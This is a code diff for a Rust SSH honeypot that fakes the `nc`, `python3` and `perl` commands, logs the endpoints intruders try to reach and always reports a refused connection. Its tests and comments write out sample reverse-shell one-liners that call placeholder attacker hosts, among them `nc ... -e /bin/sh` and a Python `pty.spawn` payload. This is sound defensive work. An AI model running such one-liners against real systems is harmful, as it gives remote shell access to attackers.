@@ -1,8 +1,15 @@
-//! Network commands: `wget`, `curl`, `ping`, `netstat`, `ss`, `ip`.
+//! Network commands: `wget`, `curl`, `ping`, `netstat`, `ss`, `ip`, `nc`, and
+//! the `python3`/`perl` invocation stubs.
 //!
-//! None of these touch the real network. They render believable output and, for
-//! `wget`/`curl`, record the requested URL as a [`Capture`] for forensic logging
-//! and drop a placeholder file into the in-memory VFS.
+//! None of these touch the real network. They render believable output and
+//! record every remote endpoint an attacker named as a [`Capture`] for forensic
+//! logging; `wget`/`curl` additionally drop a placeholder file into the
+//! in-memory VFS.
+//!
+//! The interpreters live here because that is what they are used for: a
+//! `python3 -c` one-liner in an SSH session is a reverse shell far more often
+//! than it is anything else, and it is captured the same way a `wget` URL is.
+//! Nothing is ever interpreted — see [`python3`].
 
 use super::CommandResult;
 use crate::shell::{Capture, Shell};
@@ -494,6 +501,358 @@ fn human(bytes: u64) -> String {
     format!("{value:.1}{}", UNITS[unit])
 }
 
+/// `nc [-lvnz] [-w SECS] [-e CMD] HOST PORT...`
+///
+/// No socket is ever opened — the same rule `wget` and `curl` follow. The
+/// endpoint is captured, because `nc 1.2.3.4 4444 -e /bin/sh` names the C2 the
+/// operator most wants out of a session, and then the connect fails.
+///
+/// "Connection refused" is the honest answer: it is by far the most common real
+/// outcome (the attacker's listener is usually already gone), it is instant, and
+/// it keeps them trying other tools rather than believing they have a shell.
+pub fn nc(shell: &mut Shell, args: &[String]) -> CommandResult {
+    let mut listen = false;
+    let mut port_flag = false;
+    let mut verbose = false;
+    let mut scan = false;
+    let mut udp = false;
+    let mut operands: Vec<String> = Vec::new();
+    let mut iter = args.iter();
+
+    while let Some(arg) = iter.next() {
+        match arg.as_str() {
+            // Flags that take a value, consumed so the value is not read as a
+            // host or a port.
+            "-w" | "-e" | "-c" | "-s" | "-X" | "-x" | "-i" | "-q" | "-O" | "-P" | "-T" => {
+                iter.next();
+            }
+            s if s.starts_with('-') && s.len() > 1 && !s.starts_with("--") => {
+                for c in s[1..].chars() {
+                    match c {
+                        'l' => listen = true,
+                        'p' => port_flag = true,
+                        'v' => verbose = true,
+                        'z' => scan = true,
+                        'u' => udp = true,
+                        _ => {}
+                    }
+                }
+                // A bundled value-taking flag consumes the next argument too,
+                // as in `nc -lvp 4444` or `nc -w 3 host port`.
+                if s[1..].ends_with(['w', 'e', 'c', 's', 'i', 'p', 'q']) {
+                    if let Some(v) = iter.next() {
+                        if s[1..].ends_with('p') {
+                            operands.push(v.clone());
+                        }
+                    }
+                }
+            }
+            other => operands.push(other.to_string()),
+        }
+    }
+
+    if listen {
+        // Debian 12 ships netcat-openbsd, which really does refuse this — and
+        // `nc -lvp PORT` is the syntax attackers type, carried over from
+        // netcat-traditional. Reproducing the refusal is both faithful and the
+        // reason listen mode needs no further emulation here.
+        if port_flag {
+            return CommandResult::err("nc: cannot use -p and -l\n", 1);
+        }
+        // ponytail: a real `nc -l PORT` holds the terminal until interrupted.
+        // Returning immediately is a tell on an interactive channel. Upgrade
+        // when the screen-hold in `top` is generalised beyond its own frame
+        // type; until then, bind shells are the rarer half of nc's use here.
+        return CommandResult::empty();
+    }
+
+    let proto = if udp { "udp" } else { "tcp" };
+    let mut operands = operands.into_iter();
+    let Some(host) = operands.next() else {
+        return CommandResult::err(
+            "usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]\n",
+            1,
+        );
+    };
+    let ports: Vec<String> = operands.collect();
+    if ports.is_empty() {
+        return CommandResult::err("nc: missing port number\n", 1);
+    }
+
+    let mut errs = String::new();
+    for port in ports {
+        shell.captures.push(Capture::Download {
+            tool: "nc".into(),
+            url: format!("{proto}://{host}:{port}"),
+            dest: "-".into(),
+        });
+        // netcat-openbsd is silent on a failed connect unless asked; only
+        // `-v`/`-z` print the diagnostic.
+        if verbose || scan {
+            errs.push_str(&format!(
+                "nc: connect to {host} port {port} ({proto}) failed: Connection refused\n"
+            ));
+        }
+    }
+    CommandResult::err(errs, 1)
+}
+
+/// `python3` — see the note below; `perl` is [`perl`].
+///
+/// No interpreter is emulated, and none should be: running attacker code is the
+/// one thing this box exists not to do. What matters is the *invocation* — the
+/// `-c` payload is the intelligence, and the `command` event already records
+/// the whole line verbatim, including the one-liner. Before this existed the
+/// same line came back `command not found`, which both lost the interaction and
+/// told a scanner the box has no Python while `dpkg -l` lists python3 as
+/// installed. That contradiction was the real cost.
+///
+/// The one-liner attackers reach for is a reverse shell, and the outcome a real
+/// box gives it most of the time is a connect that fails — their listener is
+/// usually already gone. So a payload that tries to reach the network gets the
+/// traceback that failure produces, and anything else exits quietly.
+pub fn python3(shell: &mut Shell, args: &[String]) -> CommandResult {
+    interpreter(shell, "python3", args)
+}
+
+/// `perl` — see [`interpreter`].
+pub fn perl(shell: &mut Shell, args: &[String]) -> CommandResult {
+    interpreter(shell, "perl", args)
+}
+
+fn interpreter(shell: &mut Shell, name: &str, args: &[String]) -> CommandResult {
+    let perl = name == "perl";
+
+    let mut iter = args.iter();
+    while let Some(arg) = iter.next() {
+        match arg.as_str() {
+            "--version" | "-V" => return CommandResult::ok(interpreter_version(name)),
+            "-v" if perl => return CommandResult::ok(interpreter_version(name)),
+            "-c" | "-e" => {
+                let Some(code) = iter.next() else {
+                    let msg = if perl {
+                        "Missing argument to -e.\n"
+                    } else {
+                        "Argument expected for the -c option\nusage: python3 [option] ... \n"
+                    };
+                    return CommandResult::err(msg, 2);
+                };
+                return run_inline(shell, name, code);
+            }
+            // Flags that take a value; consumed so the value is not mistaken
+            // for a script path.
+            "-m" | "-W" | "-X" | "-I" if !perl => {
+                iter.next();
+                return CommandResult::empty();
+            }
+            s if s.starts_with('-') && s.len() > 1 => {}
+            script => return run_script(shell, name, script),
+        }
+    }
+
+    // No script and no `-c`: the interpreter reads its program from stdin,
+    // which is how `curl … | python3` and `python3 < payload` arrive.
+    if shell.stdin.is_some() {
+        return CommandResult::empty();
+    }
+    // With no stdin either, python prints its banner and exits at EOF. Perl
+    // waits for input and then exits silently.
+    if perl {
+        CommandResult::empty()
+    } else {
+        CommandResult::ok(format!(
+            "{}\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n",
+            interpreter_banner(name)
+        ))
+    }
+}
+
+/// Run a `-c`/`-e` one-liner. Nothing is executed; the payload is already in the
+/// `command` event, so all this decides is what the attacker sees back.
+fn run_inline(shell: &mut Shell, name: &str, code: &str) -> CommandResult {
+    let Some((host, port)) = inline_endpoint(code) else {
+        // A non-network one-liner: most of these really do exit 0 with no
+        // output, and guessing at output for code that was never run would be
+        // a fabrication, not an emulation.
+        return CommandResult::empty();
+    };
+
+    // The endpoint is worth as much as a `wget` URL, and lands in the same
+    // event so one query finds every remote host a session named.
+    shell.captures.push(Capture::Download {
+        tool: name.to_string(),
+        url: format!("tcp://{host}:{port}"),
+        dest: "-".into(),
+    });
+
+    if name == "perl" {
+        return CommandResult::err("Connection refused at -e line 1.\n", 255);
+    }
+    CommandResult::err(
+        "Traceback (most recent call last):\n  \
+         File \"<string>\", line 1, in <module>\n\
+         ConnectionRefusedError: [Errno 111] Connection refused\n",
+        1,
+    )
+}
+
+/// Run a script operand. The file has to exist in the VFS — a dropper that
+/// `wget`s a payload and then runs it should see it run, and one that names a
+/// path that was never written should see the real error.
+fn run_script(shell: &mut Shell, name: &str, script: &str) -> CommandResult {
+    match shell.vfs.resolve(shell.cwd, script) {
+        Some(id) if !shell.vfs.node(id).meta.is_dir() => {
+            // ponytail: the body is not interpreted, so a script that would
+            // have printed something prints nothing. `sh` runs its operands
+            // line by line because those lines are shell commands this box
+            // already emulates; there is no equivalent for Python. Upgrade only
+            // if captured payloads show scripts whose output attackers check.
+            CommandResult::empty()
+        }
+        Some(_) if name == "perl" => CommandResult::err(
+            format!("Can't open perl script \"{script}\": Is a directory\n"),
+            2,
+        ),
+        Some(_) => CommandResult::err(
+            format!("{name}: can't open file '{script}': [Errno 21] Is a directory\n"),
+            2,
+        ),
+        None if name == "perl" => CommandResult::err(
+            format!("Can't open perl script \"{script}\": No such file or directory\n"),
+            2,
+        ),
+        None => CommandResult::err(
+            format!(
+                "{name}: can't open file '{}': [Errno 2] No such file or directory\n",
+                abs_operand(shell, script)
+            ),
+            2,
+        ),
+    }
+}
+
+/// Python reports the absolute path it tried to open, not the operand.
+fn abs_operand(shell: &Shell, script: &str) -> String {
+    if script.starts_with('/') {
+        return script.to_string();
+    }
+    let cwd = shell.vfs.path_of(shell.cwd);
+    format!("{}/{script}", cwd.trim_end_matches('/'))
+}
+
+/// The host and port a one-liner tries to reach, if it looks like it does.
+///
+/// Deliberately shallow: a quoted host-shaped string plus the integer literal
+/// nearest to it. Python writes the pair one way round
+/// (`s.connect(("1.2.3.4",4444))`) and Perl the other
+/// (`sockaddr_in(4444,inet_aton("1.2.3.4"))`), so "nearest" is what covers both
+/// without parsing either language. Missing an exotic payload costs a
+/// traceback, not a capture — the whole command line is logged regardless.
+fn inline_endpoint(code: &str) -> Option<(String, u16)> {
+    if !code.contains("socket") && !code.contains("connect") && !code.contains("Socket") {
+        return None;
+    }
+    let chars: Vec<char> = code.chars().collect();
+    let ports = port_literals(&chars);
+
+    let mut i = 0;
+    while i < chars.len() {
+        let quote = chars[i];
+        if quote != '"' && quote != '\'' {
+            i += 1;
+            continue;
+        }
+        let Some(len) = chars[i + 1..].iter().position(|c| *c == quote) else {
+            break;
+        };
+        let host: String = chars[i + 1..i + 1 + len].iter().collect();
+        // A host is an address or a name, never empty and never a sentence.
+        let host_shaped = !host.is_empty()
+            && host.len() <= 253
+            && host
+                .chars()
+                .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == ':');
+        if host_shaped {
+            // The port literal closest to the host on either side.
+            let (start, end) = (i, i + len + 1);
+            if let Some((_, port)) = ports
+                .iter()
+                .map(|(at, port)| {
+                    let distance = if *at > end {
+                        at - end
+                    } else {
+                        start.saturating_sub(*at)
+                    };
+                    (distance, *port)
+                })
+                .min_by_key(|(distance, _)| *distance)
+            {
+                return Some((host, port));
+            }
+        }
+        i += len + 2;
+    }
+    None
+}
+
+/// Every integer literal in `code` that could be a port, with where it starts.
+/// Dotted-quad octets are excluded by requiring the run not to sit between two
+/// dots, so `1.2.3.4` never contributes a "port".
+fn port_literals(chars: &[char]) -> Vec<(usize, u16)> {
+    let mut out = Vec::new();
+    let mut i = 0;
+    while i < chars.len() {
+        if !chars[i].is_ascii_digit() {
+            i += 1;
+            continue;
+        }
+        let start = i;
+        while i < chars.len() && chars[i].is_ascii_digit() {
+            i += 1;
+        }
+        let dotted = (start > 0 && chars[start - 1] == '.') || chars.get(i) == Some(&'.');
+        let digits: String = chars[start..i].iter().collect();
+        if !dotted {
+            if let Ok(port) = digits.parse::<u16>() {
+                if port > 0 {
+                    out.push((start, port));
+                }
+            }
+        }
+    }
+    out
+}
+
+/// The `--version` line each interpreter prints.
+fn interpreter_version(name: &str) -> String {
+    if name == "perl" {
+        return "\nThis is perl 5, version 36, subversion 0 (v5.36.0) built for \
+                x86_64-linux-gnu-thread-multi\n\n\
+                Copyright 1987-2022, Larry Wall\n\n\
+                Perl may be copied only under the terms of either the Artistic License or the\n\
+                GNU General Public License, which may be found in the Perl 5 source kit.\n\n\
+                Complete documentation for Perl, including FAQ lists, should be found on\n\
+                this system using \"man perl\" or \"perldoc perl\".  If you have access to the\n\
+                Internet, point your browser at https://www.perl.org/, the Perl Home Page.\n\n"
+            .to_string();
+    }
+    format!("{}\n", python_version())
+}
+
+/// The banner the interactive interpreter prints before its first prompt.
+fn interpreter_banner(_name: &str) -> String {
+    format!(
+        "{} (main, Mar 13 2023, 09:44:40) [GCC 12.2.0] on linux",
+        python_version()
+    )
+}
+
+/// Kept in one place so `python3 --version`, the REPL banner and the
+/// `python3` entry in the package database cannot drift apart.
+fn python_version() -> &'static str {
+    "Python 3.11.2"
+}
+
 #[cfg(test)]
 mod tests {
     use super::url_parts;
@@ -595,5 +954,98 @@ mod tests {
         assert!(run(&mut shell, "ss -tlnp").contains("sshd"));
         assert!(run(&mut shell, "ip addr").contains("eth0"));
         assert!(run(&mut shell, "ip route").contains("default via"));
+    }
+    #[test]
+    fn nc_never_connects_but_records_the_endpoint() {
+        let mut shell = Shell::new("root", "debian");
+        let result = shell.execute("nc -v 198.51.100.9 4444");
+        assert_eq!(result.status, 1);
+        assert!(
+            result.stderr.contains("failed: Connection refused"),
+            "{}",
+            result.stderr
+        );
+        // The endpoint is worth as much as a wget URL and lands in the same
+        // capture channel, so one query finds every remote host a session named.
+        assert!(shell.captures.iter().any(|c| matches!(
+            c,
+            Capture::Download { tool, url, .. }
+                if tool == "nc" && url == "tcp://198.51.100.9:4444"
+        )));
+    }
+
+    #[test]
+    fn nc_listen_matches_what_debian_actually_does() {
+        let mut shell = Shell::new("root", "debian");
+        // Debian 12 ships netcat-openbsd, which really does refuse `-p` with
+        // `-l` — and `nc -lvp PORT` is the syntax attackers carry over from
+        // netcat-traditional.
+        let result = shell.execute("nc -lvp 4444");
+        assert_eq!(result.status, 1);
+        assert!(result.stderr.contains("cannot use -p and -l"));
+    }
+
+    #[test]
+    fn python3_captures_a_reverse_shell_and_refuses_the_connection() {
+        let mut shell = Shell::new("root", "debian");
+        let payload = "python3 -c 'import socket,os,pty;s=socket.socket();\
+                       s.connect((\"198.51.100.9\",9001));pty.spawn(\"/bin/sh\")'";
+        let result = shell.execute(payload);
+        assert_eq!(result.status, 1);
+        assert!(
+            result.stderr.contains("ConnectionRefusedError"),
+            "{}",
+            result.stderr
+        );
+        assert!(shell.captures.iter().any(|c| matches!(
+            c,
+            Capture::Download { tool, url, .. }
+                if tool == "python3" && url == "tcp://198.51.100.9:9001"
+        )));
+    }
+
+    #[test]
+    fn python3_runs_nothing_and_says_so_consistently() {
+        let mut shell = Shell::new("root", "debian");
+        // A non-network one-liner exits quietly: inventing output for code that
+        // was never run would be a fabrication, not an emulation.
+        let quiet = shell.execute("python3 -c 'print(1+1)'");
+        assert_eq!(quiet.status, 0);
+        assert_eq!(quiet.stdout, "");
+
+        // The version must match what `dpkg -l` reports, or one command
+        // contradicts the other.
+        let version = shell.execute("python3 --version");
+        assert_eq!(version.stdout.trim(), "Python 3.11.2");
+        assert!(shell.execute("dpkg -l").stdout.contains("3.11.2"));
+
+        // A script that was never dropped gets the real error, with the
+        // absolute path python reports rather than the operand.
+        let missing = shell.execute("python3 /tmp/nope.py");
+        assert_eq!(missing.status, 2);
+        assert!(
+            missing.stderr.contains("/tmp/nope.py': [Errno 2]"),
+            "{}",
+            missing.stderr
+        );
+
+        // Debian 12 has no /usr/bin/python, only python3.
+        assert_eq!(shell.execute("python -c 'pass'").status, 127);
+    }
+
+    #[test]
+    fn perl_reports_its_own_failures_not_pythons() {
+        let mut shell = Shell::new("root", "debian");
+        let result = shell.execute(
+            "perl -e 'use Socket;connect(S,sockaddr_in(4444,inet_aton(\"203.0.113.5\")))'",
+        );
+        assert_eq!(result.status, 255);
+        assert!(result.stderr.contains("Connection refused at -e line 1."));
+        assert!(shell.captures.iter().any(|c| matches!(
+            c,
+            Capture::Download { tool, url, .. }
+                if tool == "perl" && url == "tcp://203.0.113.5:4444"
+        )));
+        assert!(shell.execute("perl -v").stdout.contains("v5.36.0"));
     }
 }
